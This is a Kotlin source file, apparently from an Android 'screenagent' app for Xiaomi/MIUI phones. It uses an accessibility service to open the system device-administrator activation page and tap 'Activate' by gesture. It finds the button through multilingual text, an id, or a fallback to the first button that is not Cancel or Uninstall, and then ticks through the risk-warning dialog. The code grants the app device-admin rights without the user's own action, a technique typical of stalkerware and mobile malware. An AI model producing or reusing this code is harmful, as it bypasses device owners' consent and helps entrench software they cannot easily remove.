package com.zaka.screenagent.flow.miui

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService
import com.zaka.screenagent.admin.MoyingAdminReceiver

/**
 * 第二步：设备管理员（小米）
 *
 *   ① 打开系统激活页
 *   ② 等 2 秒 → 找到「启用此设备管理应用」→ 手势点击
 *   ③ 危险页出现 → 2 秒后勾「我已知晓」（不点「确定」）
 */
object Step2 {

    private const val TAG = "Step2"
    private val ui = Handler(Looper.getMainLooper())

    fun run(service: BoundaryAccessibilityService, onDone: (Boolean) -> Unit) {
        Log.d(TAG, "打开激活页")
        openPage(service)

        // ② 等 2 秒点「启用」
        ui.postDelayed({ Log.d(TAG, "点击启用 = ${clickEnable(service)}") }, 2_000L)

        // ③ 等危险页 → 勾「我已知晓」
        ui.postDelayed({
            MiuiNavigator.passRiskDialog(service) {
                val active = MoyingAdminReceiver.isActive(service)
                Log.d(TAG, "管理员=$active")
                onDone(active)
            }
        }, 5_000L)
    }

    private fun openPage(service: BoundaryAccessibilityService) {
        runCatching {
            service.startActivity(
                Intent(service, MiuiAdminActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            )
        }.onFailure { Log.w(TAG, "打开激活页失败 $it") }
    }

    /** 找「启用此设备管理应用」并用坐标手势点击（该按钮 clickable=false） */
    private fun clickEnable(service: BoundaryAccessibilityService): Boolean {
        val roots = ArrayList<AccessibilityNodeInfo>()
        runCatching { service.windows.orEmpty().forEach { w -> w.root?.let { roots.add(it) } } }
        service.rootInActiveWindow?.let { roots.add(it) }

        // ① 按文案（多语言）
        for (root in roots) {
            for (t in ENABLE_TEXTS) {
                val n = findText(root, t, 0) ?: continue
                if (!n.isEnabled) continue
                if (MiuiNavigator.tapByGesture(service, n)) {
                    Log.d(TAG, "点击启用 text=$t")
                    return true
                }
            }
        }
        // ② 按 id=action_button
        for (root in roots) {
            val n = findId(root, "action_button", 0) ?: continue
            if (MiuiNavigator.tapByGesture(service, n)) {
                Log.d(TAG, "点击启用 id=action_button")
                return true
            }
        }
        // ③ 兜底：页面里第一个可用按钮（排除取消/卸载）
        for (root in roots) {
            val n = firstButton(root, 0) ?: continue
            if (MiuiNavigator.tapByGesture(service, n)) {
                Log.d(TAG, "点击启用 兜底首个按钮 text=${n.text}")
                return true
            }
        }
        Log.d(TAG, "没找到「启用」按钮")
        return false
    }

    /** 启用按钮的多语言文案 */
    private val ENABLE_TEXTS = listOf(
        "启用此设备管理应用", "启用设备管理应用", "启用", "激活",
        "Activate this device admin app", "Activate device admin app", "Activate", "Enable",
        "Activar esta aplicación de administración de dispositivos", "Activar",
        "Ativar este app de administração do dispositivo", "Ativar",
        "Aktifkan aplikasi admin perangkat ini", "Aktifkan",
        "Kích hoạt ứng dụng quản trị thiết bị này", "Kích hoạt",
        "تفعيل تطبيق مسؤول الجهاز هذا", "تفعيل",
        "इस डिवाइस एडमिन ऐप को सक्रिय करें", "सक्रिय करें",
        "이 기기 관리 앱 활성화", "활성화",
        "デバイス管理アプリを有効にする", "有効にする",
        "이 기기 관리 앱 활성화"
    )

    private val SKIP_TEXTS = listOf("取消", "卸载应用", "Cancel", "Uninstall", "Cancelar", "Desinstalar")

    /** 页面里第一个可点按钮（跳过取消/卸载） */
    private fun firstButton(n: AccessibilityNodeInfo?, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 30) return null
        if (n.className?.toString() == "android.widget.Button" && n.isEnabled) {
            val t = n.text?.toString().orEmpty()
            if (SKIP_TEXTS.none { t.contains(it) }) return n
        }
        for (i in 0 until n.childCount) firstButton(n.getChild(i), d + 1)?.let { return it }
        return null
    }

    private fun findId(n: AccessibilityNodeInfo?, suffix: String, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 30) return null
        if (n.viewIdResourceName.orEmpty().endsWith(suffix)) return n
        for (i in 0 until n.childCount) findId(n.getChild(i), suffix, d + 1)?.let { return it }
        return null
    }

    private fun findText(n: AccessibilityNodeInfo?, want: String, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 30) return null
        if (n.text?.toString() == want) return n
        for (i in 0 until n.childCount) findText(n.getChild(i), want, d + 1)?.let { return it }
        return null
    }

}

/** 激活页载体：前台 Activity 才能拉起系统激活页 */
class MiuiAdminActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.d("MiuiAdminActivity", "打开激活页")
        runCatching {
            startActivityForResult(MoyingAdminReceiver.activationIntent(this, newTask = false), 2001)
        }.onFailure { Log.w("MiuiAdminActivity", "失败: $it") }
        Handler(Looper.getMainLooper()).postDelayed({ finish() }, 1_500L)
    }
}
